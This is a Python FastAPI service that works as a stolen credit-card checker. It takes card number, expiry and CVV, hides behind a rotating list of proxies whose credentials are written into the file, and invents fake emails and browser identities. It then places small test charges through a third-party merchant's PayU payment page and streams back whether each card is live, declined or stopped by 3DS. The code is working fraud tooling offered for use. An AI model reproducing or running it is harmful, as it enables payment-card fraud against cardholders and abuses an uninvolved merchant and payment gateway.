from fastapi import FastAPI, Query, HTTPException
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import StreamingResponse
import re
import json
import time
import random
import string
import requests

app = FastAPI()

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# PROXY CONFIGURATION
PROXIES_LIST = [
    "http://209492:c7gA2juE4@107.175.33.157:8800",
    "http://209492:c7gA2juE4@107.175.33.171:8800",
    "http://209492:c7gA2juE4@107.175.66.153:8800",
    "http://209492:c7gA2juE4@107.175.66.167:8800",
    "http://209492:c7gA2juE4@107.175.78.165:8800",
    "http://209492:c7gA2juE4@107.175.78.188:8800",
    "http://209492:c7gA2juE4@107.175.152.196:8800",
    "http://209492:c7gA2juE4@107.175.152.204:8800",
    "http://209492:c7gA2juE4@107.175.152.220:8800",
    "http://209492:c7gA2juE4@107.175.152.244:8800",
]

def get_random_proxy():
    proxy_url = random.choice(PROXIES_LIST)
    return {
        "http": proxy_url,
        "https": proxy_url
    }

def _random_email():
    chars = string.ascii_lowercase + string.digits
    user = ''.join(random.choices(chars, k=10))
    return f"{user}@gmail.com"

def _random_ua():
    versions = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
    ]
    return random.choice(versions)

def _poll_status(session, order_id, token, ua, max_attempts=10, delay=3):
    headers = {
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'authorization': f'Bearer {token}',
        'priority': 'u=1, i',
        'referer': f'https://secure.payu.com/pay/?orderId={order_id}&token={token}',
        'sec-ch-ua': '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Linux"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': ua,
    }

    data = {}
    for i in range(max_attempts):
        time.sleep(delay)
        r = session.get(f'https://secure.payu.com/api/front/orders/{order_id}/status', headers=headers, timeout=30)

        try:
            data = r.json()
        except Exception:
            try:
                data = json.loads(r.text)
            except Exception:
                data = {"raw": r.text, "status_code": r.status_code}

        category = data.get('category')
        if category not in ('IN_PROGRESS', 'NEW'):
            return data

        if i == max_attempts - 1:
            return data

    return data

def event_stream(card_num, mm, yy, cvv_code, merchant_url):
    proxies = get_random_proxy()
    proxy_ip = proxies['http'].split('@')[-1]
    
    session = requests.Session()
    session.proxies = proxies

    try:
        email = _random_email()
        ua = _random_ua()
        name = "Jan Kowalski"

        if len(yy) == 2:
            yy = '20' + yy

        yield f"data: {json.dumps({'type': 'log', 'msg': f'Routing traffic via Proxy -> {proxy_ip}', 'class': 'info'})}\n\n"

        # STEP 0.5: GET PAGE UNTUK DAPAT COOKIE (PENAMBAHAN BARU)
        yield f"data: {json.dumps({'type': 'log', 'msg': 'Accessing merchant page to bypass security (Cookies)...', 'class': 'info'})}\n\n"
        
        headers_init = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'sec-ch-ua': '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Linux"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': ua,
        }
        
        # Pergi ke page utama dulu untuk simpan Cookie (csrf token, session, dll)
        session.get(merchant_url, headers=headers_init, timeout=30)
        yield f"data: {json.dumps({'type': 'log', 'msg': 'Session cookies harvested successfully.', 'class': 'success'})}\n\n"

        # STEP 1: MERCHANT REQUEST
        yield f"data: {json.dumps({'type': 'log', 'msg': 'Initiating order creation via Merchant API...', 'class': 'info'})}\n\n"
        
        headers1 = {
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': merchant_url,
            'referer': merchant_url,
            'sec-ch-ua': '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Linux"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': ua,
            'x-requested-with': 'XMLHttpRequest',
        }

        data1 = {
            'amount': '20',
            'firstname': name.split()[0],
            'lastname': name.split()[1],
            'email': email,
            'extra': '',
        }

        r1 = session.post(f'{merchant_url}ajax/horse_payu/', headers=headers1, data=data1, timeout=30)

        order_id = None
        token = None

        try:
            res1 = r1.json()
            order_id = res1.get('orderId') or res1.get('order_id')
            token = res1.get('token') or res1.get('payu_token')
            
            if not order_id or not token:
                redirect = res1.get('redirectUri') or res1.get('redirect_url') or res1.get('url') or ''
                if redirect:
                    oid = re.search(r'orderId=([^&]+)', redirect)
                    tok = re.search(r'token=([^&]+)', redirect)
                    if oid: order_id = oid.group(1)
                    if tok: token = tok.group(1)
        except Exception:
            pass

        if not order_id or not token:
            body = r1.text
            oid = re.search(r'orderId=([^&]+)', body)
            tok = re.search(r'token=([^&]+)', body)
            if oid: order_id = oid.group(1)
            if tok: token = tok.group(1)

        if not order_id or not token:
            err_msg = f"Failed to extract Order ID or Token from merchant."
            yield f"data: {json.dumps({'type': 'log', 'msg': err_msg, 'class': 'error'})}\n\n"
            yield f"data: {json.dumps({'type': 'result', 'msg': err_msg, 'status': 'error', 'raw': {'error': r1.text[:500]}})}\n\n"
            return

        yield f"data: {json.dumps({'type': 'log', 'msg': f'Merchant Order Created -> ID: {order_id}', 'class': 'success'})}\n\n"

        # STEP 2: LOAD PAYU PAGE
        yield f"data: {json.dumps({'type': 'log', 'msg': 'Accessing PayU Secure Payment Gateway...', 'class': 'info'})}\n\n"
        
        params2 = {'orderId': order_id, 'token': token}
        headers2 = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'referer': merchant_url,
            'user-agent': ua,
        }

        page_resp = session.get('https://secure.payu.com/pay/', params=params2, headers=headers2, timeout=30)
        
        final_amount = 2000 
        final_currency = 'PLN'
        
        try:
            html_content = page_resp.text
            amt_match = re.search(r'"totalAmount"\s*:\s*"?(\d+)"?', html_content)
            curr_match = re.search(r'"currencyCode"\s*:\s*"([A-Z]{3})"', html_content)
            if amt_match: final_amount = int(amt_match.group(1))
            if curr_match: final_currency = curr_match.group(1)
            yield f"data: {json.dumps({'type': 'log', 'msg': f'Gateway loaded. Amount: {final_amount/100} {final_currency}', 'class': 'info'})}\n\n"
        except:
            yield f"data: {json.dumps({'type': 'log', 'msg': 'Gateway loaded.', 'class': 'info'})}\n\n"

        # STEP 3: TOKENIZE CARD
        yield f"data: {json.dumps({'type': 'log', 'msg': f'Tokenizing Card: {card_num[:6]}******{card_num[-4:]}...', 'class': 'info'})}\n\n"
        
        headers3 = {
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'authorization': f'Bearer {token}',
            'content-type': 'application/json',
            'origin': 'https://secure.payu.com',
            'referer': f'https://secure.payu.com/pay/?orderId={order_id}&token={token}',
            'user-agent': ua,
        }

        json3 = {
            'posId': 'PAYU S.A.',
            'type': 'SINGLE',
            'card': {
                'number': card_num,
                'cvv': cvv_code, 
                'expirationMonth': mm,
                'expirationYear': yy,
            },
        }

        r3 = session.post('https://secure.payu.com/api/front/tokens', headers=headers3, json=json3, timeout=30)

        try:
            token_data = r3.json()
        except Exception:
            try:
                token_data = json.loads(r3.text)
            except Exception:
                token_data = {"raw": r3.text, "status_code": r3.status_code}

        card_token = token_data.get('value')

        if not card_token:
            error_obj = token_data.get('error', {})
            if isinstance(error_obj, dict):
                error_msg = error_obj.get('message', '') or error_obj.get('description', '')
            else:
                error_msg = str(token_data.get('error', ''))
            
            if not error_msg:
                error_msg = f"Invalid card details or unsupported card type. (Raw: {str(token_data)[:100]})"
            
            yield f"data: {json.dumps({'type': 'log', 'msg': f'Tokenization Failed: {error_msg}', 'class': 'error'})}\n\n"
            yield f"data: {json.dumps({'type': 'result', 'msg': f'Card Declined: {error_msg}', 'status': 'error', 'raw': token_data})}\n\n"
            return

        yield f"data: {json.dumps({'type': 'log', 'msg': 'Card tokenized successfully.', 'class': 'success'})}\n\n"

        # STEP 4: SUBMIT PAYMENT
        yield f"data: {json.dumps({'type': 'log', 'msg': 'Submitting payment charge to PayU...', 'class': 'info'})}\n\n"
        
        masked = card_num[:6] + '*' * 6 + card_num[-4:]

        json4 = {
            'email': email,
            'firstName': name.split()[0],
            'lastName': name.split()[1],
            'currency': final_currency,
            'amount': final_amount,
            'payMethod': {
                'type': 'c',
                'token': card_token,
                'cardDetails': {
                    'maskedCardNumber': masked,
                },
            },
            'metadata': {'cardInputTime': 9039},
            'browserData': {
                'screenWidth': 800,
                'javaEnabled': False,
                'timezoneOffset': -330,
                'screenHeight': 1280,
                'userAgent': ua,
                'colorDepth': 24,
                'language': 'en-US',
                'challengeWindowSize': '04',
            },
            'language': 'en',
        }

        r4 = session.post(f'https://secure.payu.com/api/front/orders/{order_id}/payments', headers=headers3, json=json4, timeout=30)

        try:
            pay_data = r4.json()
        except Exception:
            try:
                pay_data = json.loads(r4.text)
            except Exception:
                pay_data = {"raw": r4.text, "status_code": r4.status_code}

        if pay_data.get('status') == 'ERROR' or pay_data.get('errorCode'):
            err_desc = pay_data.get('error', {}).get('description', '') if isinstance(pay_data.get('error'), dict) else str(pay_data.get('error', ''))
            yield f"data: {json.dumps({'type': 'log', 'msg': f'PayU Rejected: {pay_data.get("errorCode")} - {err_desc}', 'class': 'error'})}\n\n"
            yield f"data: {json.dumps({'type': 'result', 'msg': f'Payment declined: {err_desc}', 'status': 'error', 'raw': pay_data})}\n\n"
            return

        yield f"data: {json.dumps({'type': 'log', 'msg': 'Payment accepted by PayU. Waiting for Bank response...', 'class': 'success'})}\n\n"

        # STEP 5: POLL STATUS
        continue_url = pay_data.get('continueUrl')

        if continue_url and 'threeds' in continue_url:
            yield f"data: {json.dumps({'type': 'log', 'msg': '3DS Security protocol triggered. Polling bank status...', 'class': 'warn'})}\n\n"
            final_status = _poll_status(session, order_id, token, ua, max_attempts=10, delay=3)
        else:
            yield f"data: {json.dumps({'type': 'log', 'msg': 'No 3DS triggered. Checking direct status...', 'class': 'info'})}\n\n"
            final_status = _poll_status(session, order_id, token, ua, max_attempts=3, delay=2)

        category = final_status.get('category', '')
        value = final_status.get('value', '')

        if category == 'SUCCESS':
            yield f"data: {json.dumps({'type': 'log', 'msg': 'Transaction completed: PAYMENT SUCCESSFUL', 'class': 'success'})}\n\n"
            yield f"data: {json.dumps({'type': 'result', 'msg': 'Payment Successful', 'status': 'success', 'raw': final_status})}\n\n"
        
        elif category in ('WARNING_CONTINUE_3DS', 'IN_PROGRESS'):
            yield f"data: {json.dumps({'type': 'log', 'msg': f'Bank Response: 3DS_REQUIRED / {value}', 'class': 'error'})}\n\n"
            yield f"data: {json.dumps({'type': 'log', 'msg': 'Conclusion: 3DS Card detected. Marked as DECLINED (Cannot bypass OTP).', 'class': 'error'})}\n\n"
            yield f"data: {json.dumps({'type': 'result', 'msg': 'Declined: 3DS Security Block', 'status': 'error', 'raw': final_status})}\n\n"
        
        elif category == 'ERROR':
            yield f"data: {json.dumps({'type': 'log', 'msg': f'Bank Response: {value}', 'class': 'error'})}\n\n"
            yield f"data: {json.dumps({'type': 'log', 'msg': 'Conclusion: Card declined by bank (Dead/Blocked/No Funds).', 'class': 'error'})}\n\n"
            yield f"data: {json.dumps({'type': 'result', 'msg': f'Payment declined: {value}', 'status': 'error', 'raw': final_status})}\n\n"
        
        else:
            yield f"data: {json.dumps({'type': 'log', 'msg': f'Uncertain Gateway Response: {category} - {value}', 'class': 'warn'})}\n\n"
            yield f"data: {json.dumps({'type': 'result', 'msg': f'{category}: {value}', 'status': 'error', 'raw': final_status})}\n\n"

    except requests.exceptions.ProxyError:
        yield f"data: {json.dumps({'type': 'log', 'msg': 'Proxy Error. Failed to connect to the proxy server.', 'class': 'error'})}\n\n"
        yield f"data: {json.dumps({'type': 'result', 'msg': 'Proxy Connection Failed', 'status': 'error', 'raw': {}})}\n\n"
    except requests.exceptions.Timeout:
        yield f"data: {json.dumps({'type': 'log', 'msg': 'Connection Timeout. Gateway took too long to respond.', 'class': 'error'})}\n\n"
        yield f"data: {json.dumps({'type': 'result', 'msg': 'Timeout from Payment Gateway', 'status': 'error', 'raw': {}})}\n\n"
    except Exception as e:
        yield f"data: {json.dumps({'type': 'log', 'msg': f'System Critical Error: {str(e)}', 'class': 'error'})}\n\n"
        yield f"data: {json.dumps({'type': 'result', 'msg': f'Error: {str(e)}', 'status': 'error', 'raw': {}})}\n\n"
    finally:
        session.close()

@app.get("/check")
def check_card(cc: str = Query(...), url: str = Query("https://beta3.centaurus.org.pl/payu/")):
    parts = cc.split('|')
    if len(parts) != 4:
        raise HTTPException(status_code=400, detail="Invalid format. Use: cc|mm|yy|cvv")
    
    card_num, mm, yy, cvv_code = parts
    mm = mm.zfill(2)
    if len(yy) == 2:
        yy = '20' + yy
        
    if not url.endswith('/'):
        url += '/'
        
    return StreamingResponse(event_stream(card_num, mm, yy, cvv_code, url), media_type="text/event-stream")
